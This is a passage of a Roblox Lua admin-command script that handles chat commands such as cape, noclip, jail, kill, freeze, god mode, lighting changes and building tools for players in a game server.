for i, v in pairs(game.Workspace:children()) do if v.Name == "LightEdit" then v:Destroy() end end
end

if msg:lower() == "cmdbar" or msg:lower() == "cmdgui" then
coroutine.resume(coroutine.create(function()
for i,v in pairs(plr.PlayerGui:children()) do if v.Name == "CMDBAR" then v:Destroy() end end
local scr = Instance.new("ScreenGui", plr.PlayerGui) scr.Name = "CMDBAR"
local box = Instance.new("TextBox", scr) box.BackgroundColor3 = Color3.new(0,0,0) box.TextColor3 = Color3.new(1,1,1) box.Font = "Arial" box.FontSize = "Size14" box.Text = "Type a command, then press enter." box.Size = UDim2.new(0,250,0,20) box.Position = UDim2.new(1,-250,1,-22) box.BorderSizePixel = 0 box.TextXAlignment = "Right" box.ZIndex = 10 box.ClipsDescendants = true
box.Changed:connect(function(p) if p == "Text" and box.Text ~= "Type a command, then press enter." then Chat(box.Text, plr) box.Text = "Type a command, then press enter." end end)
end))
end

if msg:lower():sub(1,10) == "countdown " then
local num = math.min(tonumber(msg:sub(11)),120)
for i = num, 1, -1 do
coroutine.resume(coroutine.create(function() Message("Countdown", i, false, game.Players:children(), 1) end))
wait(1)
end
end

if msg:lower():sub(1,3) == "tm " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local num = tonumber(msg:sub(4,chk1-1))
Message("Message from " .. plr.Name, msg:sub(chk1+1), false, game.Players:children(), num)
end

if msg:lower():sub(1,2) == "m " then
Message("Message from " .. plr.Name, msg:sub(3), true, game.Players:children())
end

if msg:lower():sub(1,2) == "h " then
Hint(plr.Name .. ": " .. msg:sub(3), game.Players:children())
end

if msg:lower():sub(1,3) == "pm " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local plrz = GetPlr(plr, msg:lower():sub(4,chk1-1))
Message("Private Message from " .. plr.Name, msg:sub(chk1+1), true, plrz)
end

if msg:lower():sub(1,11) == "resetstats " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("leaderstats") then
for a, q in pairs(v.leaderstats:children()) do
if q:IsA("IntValue") then q.Value = 0 end
end
end
end))
end
end

if msg:lower():sub(1,5) == "gear " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6, chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local obj = game:service("InsertService"):LoadAsset(tonumber(msg:sub(chk1+1)))
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = v.Backpack end end
obj:Destroy()
end
end))
end
end

if msg:lower():sub(1,4) == "hat " then
local chk1 = msg:lower():sub(5):find(" ") + 4
local plrz = GetPlr(plr, msg:lower():sub(5, chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
local obj = game:service("InsertService"):LoadAsset(tonumber(msg:sub(chk1+1)))
for a,hat in pairs(obj:children()) do if hat:IsA("Hat") then hat.Parent = v.Character end end
obj:Destroy()
end
end))
end
end

if msg:lower():sub(1,5) == "cape " then
local chk1 = msg:lower():sub(6):find(" ")
local plrz = GetPlr(plr, msg:lower():sub(6))
local str = "torso.BrickColor"
if chk1 then chk1 = chk1 + 5 plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
local teststr = [[BrickColor.new("]]..msg:sub(chk1+1,chk1+1):upper()..msg:sub(chk1+2):lower()..[[")]]
if msg:sub(chk1+1):lower() == "new yeller" then teststr = [[BrickColor.new("New Yeller")]] end
if msg:sub(chk1+1):lower() == "pastel blue" then teststr = [[BrickColor.new("Pastel Blue")]] end
if msg:sub(chk1+1):lower() == "dusty rose" then teststr = [[BrickColor.new("Dusty Rose")]] end
if msg:sub(chk1+1):lower() == "cga brown" then teststr = [[BrickColor.new("CGA brown")]] end
if msg:sub(chk1+1):lower() == "random" then teststr = [[BrickColor.random()]] end
if msg:sub(chk1+1):lower() == "shiny" then teststr = [[BrickColor.new("Institutional white") p.Reflectance = 1]] end
if msg:sub(chk1+1):lower() == "gold" then teststr = [[BrickColor.new("Bright yellow") p.Reflectance = .4]] end
if msg:sub(chk1+1):lower() == "kohl" then teststr = [[BrickColor.new("Really black") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=108597653"]] end
if msg:sub(chk1+1):lower() == "batman" then teststr = [[BrickColor.new("Really black") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=108597669"]] end
if msg:sub(chk1+1):lower() == "superman" then teststr = [[BrickColor.new("Bright blue") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=108597677"]] end
if msg:sub(chk1+1):lower() == "swag" then teststr = [[BrickColor.new("Pink") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=109301474"]] end
if BrickColor.new(teststr) ~= nil then str = teststr end
end
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:findFirstChild("Torso") then
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
local cl = script.LocalScriptBase:Clone() cl.Name = "CapeScript" cl.Code.Value = [[local plr = game.Players.LocalPlayer
repeat wait() until plr and plr.Character and plr.Character:findFirstChild("Torso")
local torso = plr.Character.Torso
local p = Instance.new("Part", torso.Parent) p.Name = "EpicCape" p.Anchored = false
p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0 p.BrickColor = ]]..str..[[ p.formFactor = "Custom"
p.Size = Vector3.new(.2,.2,.2)
local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
local motor1 = Instance.new("Motor", p)
motor1.Part0 = p
motor1.Part1 = torso
motor1.MaxVelocity = .01
motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
local wave = false
repeat wait(1/44)
local ang = 0.1
local oldmag = torso.Velocity.magnitude
local mv = .002
if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
ang = ang + math.min(torso.Velocity.magnitude/11, .5)
motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
motor1.DesiredAngle = -ang
if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
repeat wait() until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
if torso.Velocity.magnitude < .1 then wait(.1) end
until not p or p.Parent ~= torso.Parent
script:Destroy()
]] cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,7) == "uncape " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character then
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,7) == "noclip " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
local cl = script.LocalScriptBase:Clone() cl.Name = "NoClip" cl.Code.Value = [[repeat wait(1/44) until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer:GetMouse() and game.Workspace.CurrentCamera local mouse = game.Players.LocalPlayer:GetMouse() local torso = game.Players.LocalPlayer.Character.Torso local dir = {w = 0, s = 0, a = 0, d = 0} local spd = 2 mouse.KeyDown:connect(function(key) if key:lower() == "w" then dir.w = 1 elseif key:lower() == "s" then dir.s = 1 elseif key:lower() == "a" then dir.a = 1 elseif key:lower() == "d" then dir.d = 1 elseif key:lower() == "q" then spd = spd + 1 elseif key:lower() == "e" then spd = spd - 1 end end) mouse.KeyUp:connect(function(key) if key:lower() == "w" then dir.w = 0 elseif key:lower() == "s" then dir.s = 0 elseif key:lower() == "a" then dir.a = 0 elseif key:lower() == "d" then dir.d = 0 end end) torso.Anchored = true game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true game.Players.LocalPlayer.Character.Humanoid.Changed:connect(function() game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true end) repeat wait(1/44) torso.CFrame = CFrame.new(torso.Position, game.Workspace.CurrentCamera.CoordinateFrame.p) * CFrame.Angles(0,math.rad(180),0) * CFrame.new((dir.d-dir.a)*spd,0,(dir.s-dir.w)*spd) until nil]]
cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,5) == "clip " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then
for a, q in pairs(v.PlayerGui:children()) do if q.Name == "NoClip" then q:Destroy() end end
v.Character.Torso.Anchored = false
wait(.1) v.Character.Humanoid.PlatformStand = false
end
end))
end
end

if msg:lower():sub(1,5) == "jail " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local vname = v.Name
local cf = v.Character.Torso.CFrame + Vector3.new(0,1,0)
local mod = Instance.new("Model", game.Workspace) table.insert(objects, mod) mod.Name = v.Name .. " Jail"
local top = Instance.new("Part", mod) top.Locked = true top.formFactor = "Symmetric" top.Size = Vector3.new(6,1,6) top.TopSurface = 0 top.BottomSurface = 0 top.Anchored = true top.BrickColor = BrickColor.new("Really black") top.CFrame = cf * CFrame.new(0,-3.5,0)
v.CharacterAdded:connect(function() if not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
v.Changed:connect(function(p) if p ~= "Character" or not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
game.Players.PlayerAdded:connect(function(plr) if plr.Name == vname then v = plr end
v.CharacterAdded:connect(function() if not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
v.Changed:connect(function(p) if p ~= "Character" or not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:findFirstChild("Torso") v.Character.Torso.CFrame = cf end)
end)
local bottom = top:Clone() bottom.Parent = mod bottom.CFrame = cf * CFrame.new(0,3.5,0)
local front = top:Clone() front.Transparency = .5 front.Reflectance = .1 front.Parent = mod front.Size = Vector3.new(6,6,1) front.CFrame = cf * CFrame.new(0,0,-3)
local back = front:Clone() back.Parent = mod back.CFrame = cf * CFrame.new(0,0,3)
local right = front:Clone() right.Parent = mod right.Size = Vector3.new(1,6,6) right.CFrame = cf * CFrame.new(3,0,0)
local left = right:Clone() left.Parent = mod left.CFrame = cf * CFrame.new(-3,0,0)
local msh = Instance.new("BlockMesh", front) msh.Scale = Vector3.new(1,1,0)
local msh2 = msh:Clone() msh2.Parent = back
local msh3 = msh:Clone() msh3.Parent = right msh3.Scale = Vector3.new(0,1,1)
local msh4 = msh3:Clone() msh4.Parent = left
v.Character.Torso.CFrame = cf
end
end))
end
end

if msg:lower():sub(1,7) == "unjail " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do coroutine.resume(coroutine.create(function() if v then for a, jl in pairs(game.Workspace:children()) do if jl.Name == v.Name .. " Jail" then jl:Destroy() end end end end)) end
end

if msg:lower():sub(1,11) == "starttools " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
for a,q in pairs(game.StarterPack:children()) do q:Clone().Parent = v.Backpack end
end
end))
end
end

if msg:lower():sub(1,6) == "sword " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local sword = Instance.new("Tool", v.Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
local cl = script.LocalScriptBase:Clone() cl.Parent = sword cl.Code.Value = [[
repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
local Damage = 15
local SlashSound = Instance.new("Sound", script.Parent.Handle)
SlashSound.SoundId = "rbxasset://sounds\\swordslash.wav"
SlashSound.Volume = 1
local LungeSound = Instance.new("Sound", script.Parent.Handle)
LungeSound.SoundId = "rbxasset://sounds\\swordlunge.wav"
LungeSound.Volume = 1
local UnsheathSound = Instance.new("Sound", script.Parent.Handle)
UnsheathSound.SoundId = "rbxasset://sounds\\unsheath.wav"
UnsheathSound.Volume = 1
local last = 0
script.Parent.Handle.Touched:connect(function(hit)
if hit and hit.Parent and hit.Parent:findFirstChild("Humanoid") and game.Players:findFirstChild(hit.Parent.Name) and game.Players.LocalPlayer.Character.Humanoid.Health > 0 and hit.Parent.Humanoid ~= game.Players.LocalPlayer.Character.Humanoid then
local tag = Instance.new("ObjectValue", hit.Parent.Humanoid) tag.Value = plr1 tag.Name = "creator" game:service("Debris"):AddItem(tag, 3)
hit.Parent.Humanoid:TakeDamage(Damage)
end
end)
script.Parent.Activated:connect(function()
if not script.Parent.Enabled or game.Players.LocalPlayer.Character.Humanoid.Health <= 0 then return end
script.Parent.Enabled = false
local tick = game:service("RunService").Stepped:wait()
if tick - last <= .2 then
LungeSound:play()
local lunge = Instance.new("StringValue", script.Parent) lunge.Name = "toolanim" lunge.Value = "Lunge"
local frc = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.Torso) frc.Name = "SwordForce" frc.velocity = Vector3.new(0,10,0)
wait(.2)
script.Parent.GripForward = Vector3.new(0,0,1)
script.Parent.GripRight = Vector3.new(0,-1,0)
script.Parent.GripUp = Vector3.new(-1,0,0)
wait(.3)
frc:Destroy() wait(.5)
script.Parent.GripForward = Vector3.new(-1,0,0)
script.Parent.GripRight = Vector3.new(0,1,0)
script.Parent.GripUp = Vector3.new(0,0,1)
else
SlashSound:play()
local slash = Instance.new("StringValue", script.Parent) slash.Name = "toolanim" slash.Value = "Slash"
end
last = tick
script.Parent.Enabled = true
end)
script.Parent.Equipped:connect(function(mouse)
for i,v in pairs(game.Players.LocalPlayer.Character.Torso:children()) do if v.Name == "SwordForce" then v:Destroy() end end
UnsheathSound:play()
script.Parent.Enabled = true
if not mouse then return end
mouse.Icon = "http://www.roblox.com/asset/?id=103593352"
end)]] cl.Disabled = false 
end
end))
end
end

if msg:lower():sub(1,6) == "clone " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
v.Character.Archivable = true 
local cl = v.Character:Clone() 
table.insert(objects,cl) 
cl.Parent = game.Workspace 
cl:MoveTo(v.Character:GetModelCFrame().p)
cl:MakeJoints()
v.Character.Archivable = false 
end
end))
end
end

if msg:lower():sub(1,8) == "control " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
v.Character.Humanoid.PlatformStand = true
local w = Instance.new("Weld", plr.Character.Torso ) 
w.Part0 = plr.Character.Torso 
w.Part1 = v.Character.Torso  
local w2 = Instance.new("Weld", plr.Character.Head) 
w2.Part0 = plr.Character.Head 
w2.Part1 = v.Character.Head  
local w3 = Instance.new("Weld", plr.Character:findFirstChild("Right Arm")) 
w3.Part0 = plr.Character:findFirstChild("Right Arm")
w3.Part1 = v.Character:findFirstChild("Right Arm") 
local w4 = Instance.new("Weld", plr.Character:findFirstChild("Left Arm"))
w4.Part0 = plr.Character:findFirstChild("Left Arm")
w4.Part1 = v.Character:findFirstChild("Left Arm") 
local w5 = Instance.new("Weld", plr.Character:findFirstChild("Right Leg")) 
w5.Part0 = plr.Character:findFirstChild("Right Leg")
w5.Part1 = v.Character:findFirstChild("Right Leg") 
local w6 = Instance.new("Weld", plr.Character:findFirstChild("Left Leg")) 
w6.Part0 = plr.Character:findFirstChild("Left Leg")
w6.Part1 = v.Character:findFirstChild("Left Leg") 
plr.Character.Head.face:Destroy()
for i, p in pairs(v.Character:children()) do
if p:IsA("BasePart") then 
p.CanCollide = false
end
end
for i, p in pairs(plr.Character:children()) do
if p:IsA("BasePart") then 
p.Transparency = 1 
elseif p:IsA("Hat") then
p:Destroy()
end
end
v.Character.Parent = plr.Character
v.Character.Humanoid.Changed:connect(function() v.Character.Humanoid.PlatformStand = true end)
end
end))
end
end

if msg:lower():sub(1,5) == "kill " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v.Character:BreakJoints() end
end))
end
end

if msg:lower():sub(1,8) == "respawn " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v:LoadCharacter() end
end))
end
end

if msg:lower():sub(1,5) == "trip " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(0,0,math.rad(180)) 
end
end))
end
end

if msg:lower():sub(1,5) == "stun " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = true
end
end))
end
end

if msg:lower():sub(1,7) == "unstun " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = false
end
end))
end
end

if msg:lower():sub(1,5) == "jump " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Jump = true
end
end))
end
end

if msg:lower():sub(1,4) == "sit " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Sit = true
end
end))
end
end

if msg:lower():sub(1,10) == "invisible " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end
end
end
end))
end
end

if msg:lower():sub(1,8) == "visible " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end
end
end
end))
end
end

if msg:lower():sub(1,5) == "lock " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = true elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = true end
end
end
end))
end
end

if msg:lower():sub(1,7) == "unlock " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = false elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = false end
end
end
end))
end
end

if msg:lower():sub(1,8) == "explode " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local ex = Instance.new("Explosion", game.Workspace) ex.Position = v.Character.Torso.Position
end
end))
end
end

if msg:lower():sub(1,4) == "age " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v then Message(v.Name .. "'s age", tostring(v.AccountAge), false, {plr}) end
end))
end
end

if msg:lower():sub(1,5) == "fire " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local cl = Instance.new("Fire", v.Character.Torso) table.insert(objects, cl)
end
end))
end
end

if msg:lower():sub(1,7) == "unfire " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Fire") then cl:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,6) == "smoke " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local cl = Instance.new("Smoke", v.Character.Torso) table.insert(objects, cl)
end
end))
end
end

if msg:lower():sub(1,8) == "unsmoke " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Smoke") then cl:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,9) == "sparkles " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local cl = Instance.new("Sparkles", v.Character.Torso) table.insert(objects, cl)
end
end))
end
end

if msg:lower():sub(1,11) == "unsparkles " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Sparkles") then cl:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,3) == "ff " then
local plrz = GetPlr(plr, msg:lower():sub(4))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then Instance.new("ForceField", v.Character) end
end))
end
end

if msg:lower():sub(1,5) == "unff " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for z, cl in pairs(v.Character:children()) do if cl:IsA("ForceField") then cl:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,7) == "punish " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
v.Character.Parent = game:service("Lighting")
end
end))
end
end

if msg:lower():sub(1,9) == "unpunish " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
v.Character.Parent = game:service("Workspace")
v.Character:MakeJoints()
end
end))
end
end

if msg:lower():sub(1,7) == "freeze " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = true end v.Character.Humanoid.WalkSpeed = 0
end
end
end))
end
end

if msg:lower():sub(1,5) == "thaw " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = false end v.Character.Humanoid.WalkSpeed = 16
end
end
end))
end
end

if msg:lower():sub(1,5) == "heal " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end))
end
end

if msg:lower():sub(1,4) == "god " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = math.huge
v.Character.Humanoid.Health = 9e9
end
end))
end
end

if msg:lower():sub(1,6) == "ungod " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = 100
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end))
end
end

if msg:lower():sub(1,8) == "ambient " then
local chk1 = msg:lower():sub(9):find(" ") + 8
local chk2 = msg:sub(chk1+1):find(" ") + chk1
game.Lighting.Ambient = Color3.new(msg:sub(9,chk1-1),msg:sub(chk1+1,chk2-1),msg:sub(chk2+1))
end

if msg:lower():sub(1,11) == "brightness " then
game.Lighting.Brightness = msg:sub(12)
end

if msg:lower():sub(1,5) == "time " then
game.Lighting.TimeOfDay = msg:sub(6)
end

if msg:lower():sub(1,9) == "fogcolor " then
local chk1 = msg:lower():sub(10):find(" ") + 9
local chk2 = msg:sub(chk1+1):find(" ") + chk1
game.Lighting.FogColor = Color3.new(msg:sub(10,chk1-1),msg:sub(chk1+1,chk2-1),msg:sub(chk2+1))
end

if msg:lower():sub(1,7) == "fogend " then
game.Lighting.FogEnd = msg:sub(8)
end

if msg:lower():sub(1,9) == "fogstart " then
game.Lighting.FogStart = msg:sub(10)
end

if msg:lower():sub(1,7) == "btools " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
local cl4 = script.LocalScriptBase:Clone() cl4.Parent = t4 cl4.Code.Value = [[
repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer:findFirstChild("PlayerGui")
local sb
local hs
local pdist

script.Parent.Selected:connect(function(mouse)
if not mouse then return end
sb = Instance.new("SelectionBox", game.Players.LocalPlayer.PlayerGui) sb.Color = BrickColor.new("Bright blue") sb.Adornee = nil
hs = Instance.new("Handles", game.Players.LocalPlayer.PlayerGui) hs.Color = BrickColor.new("Bright blue") hs.Adornee = nil
mouse.Button1Down:connect(function() if not mouse.Target or mouse.Target.Locked then sb.Adornee = nil hs.Adornee = nil else sb.Adornee = mouse.Target hs.Adornee = mouse.Target hs.Faces = mouse.Target.ResizeableFaces end end)
hs.MouseDrag:connect(function(old,dist) if hs.Adornee and math.abs(dist-pdist) >= hs.Adornee.ResizeIncrement then if hs.Adornee:Resize(old, math.floor((dist-pdist)/ hs.Adornee.ResizeIncrement + .5) * hs.Adornee.ResizeIncrement) then pdist = dist end end end)
hs.MouseButton1Down:connect(function() pdist = 0 end)
end)

script.Parent.Deselected:connect(function() sb:Destroy() hs:Destroy() end)]] cl4.Disabled = false
end
end))
end
end

if msg:lower():sub(1,12) == "startergive " then
local chk1 = msg:lower():sub(13):find(" ") + 12
local plrz = GetPlr(plr, msg:lower():sub(13,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("StarterGear") and game:findFirstChild("Lighting") then 
for a, tool in pairs(game.Lighting:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if msg:lower():sub(chk1+1) == "all" or tool.Name:lower():find(msg:lower():sub(chk1+1)) == 1 then tool:Clone().Parent = v.StarterGear end
end
end
end
end))
end
end

if msg:lower():sub(1,5) == "give " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") and game:findFirstChild("Lighting") then 
